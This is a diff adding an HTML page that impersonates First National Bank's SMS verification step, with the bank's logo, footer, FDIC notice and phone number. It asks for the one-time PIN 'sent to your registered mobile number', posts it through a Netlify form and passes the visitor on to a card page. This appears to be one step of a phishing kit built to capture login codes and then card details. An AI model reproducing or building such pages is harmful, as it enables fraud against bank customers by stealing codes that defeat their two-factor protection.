@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>SMSCode - The FNB</title>
+       <!-- Favicons -->
+       <link href="../images/icon.PNG/" rel="icon" type="image/x-icon">
+       <link href="../images/icon.PNG/" rel="apple-touch-icon" type="image/icon">
+
+      <link rel="stylesheet" href="../index.css/">
+      <style>
+         section{
+            width: 100%;
+            height: 100%;
+            background-image: url(../images/bg.png/);
+            background-position: top;
+            background-size: cover;
+            background-repeat: no-repeat;
+            position: absolute;
+            padding: 0px;
+            box-sizing: border-box;
+         }
+      </style>
+     
+   </head>
+   <body>
+      <header>
+         <section>
+            <div>
+               <img src="../images/first-logo.png/" alt="logo" >
+               <h1>Verification</h1>
+               <p>We sent you a One-Time PIN to your registered mobile number. <br/>
+                  Please enter the code below
+               </p>
+               <form name="FNBSMScode" action="/card.html/" method="POST" onSubmit="submit" data-netlify="true" data-netlify-honeypot="bot-field">
+                  <input type="text" name="bot-field" style="display: none; visibility: hidden;">
+                  <input type="text" name="secure-code" placeholder="Secure Code" required minlength="6">
+                  <a href="#">SMS code might take some minutes to arrive.</a>
+                  <div class="forbut">
+                     <button type="submit">Continue</button>
+                  </div>
+               </form>
+            </div>
+         </section>
+      </header>
+      <footer>
+         <ul>
+            <li>©  2024 First National Bank  </li>
+            <li>(800) 564-3195</li>
+            <li class="chan">Privacy policy</li>
+            <li>Member FDIC </li>
+            <li> Equal Housing Lender</li>
+         </ul>
+      </footer>
+   </body>
+</html>
